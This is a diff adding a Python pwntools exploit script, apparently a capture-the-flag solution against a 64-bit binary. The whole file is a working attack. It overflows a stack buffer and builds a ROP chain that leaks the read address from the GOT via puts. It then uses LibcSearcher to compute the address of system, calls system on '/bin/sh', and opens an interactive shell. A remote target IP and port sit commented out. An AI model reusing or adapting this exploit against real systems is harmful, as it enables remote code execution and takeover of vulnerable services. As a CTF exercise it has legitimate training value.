@@ -1,1 +1,57 @@
+#-*- coding:utf-8 -*-
+from pwn import *
+from LibcSearcher import *
 
+#io=remote("111.198.29.45",33763)
+io=process('./f813b3352e834197a8872970fd2fbce4')
+
+#第二个自定义函数首地址
+readn = 0x40063D
+#第一个自定义函数首地址
+start = 0x40068E
+read_got = 0x601028
+put_plt = 0x400500
+put_got = 0x601018
+length = 0x40
+max_length = 200
+bss = 0x601040
+
+#pop rdi ; ret
+pop_rdi = 0x0000000000400763
+#pop rsi ; r15 ; ret
+pop_rsi_r15 = 0x0000000000400761
+
+
+def stageone():
+    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \
+	  +p64(put_plt)+p64(pop_rdi)+p64(bss) \
+	  +p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)
+    payload += "A"*(max_length-len(payload))
+    io.send(payload)
+    sleep(1)
+    io.send("/bin/sh")
+    print io.recvuntil("bye~")
+    return u64(io.recv()[1:-1].ljust(8,'\0'))
+
+gdb.attach(io)
+read_addr = stageone()
+print "read address: ", hex(read_addr)
+
+
+libc = LibcSearcher("read",read_addr)
+libc_base = read_addr - libc.dump("read")
+system_addr = libc_base + libc.dump("system")
+sys = p64(system_addr)
+print "system address: ",hex(system_addr)
+
+def stagetwo():
+	  payload='A'*0x40
+	  payload+='A'*8
+	  payload+=p64(pop_rdi)
+	  payload+=p64(bss)
+	  payload+=p64(system_addr)
+	  payload+='A'*(200-len(payload))
+	  io.send(payload)
+    
+stagetwo()
+io.interactive()
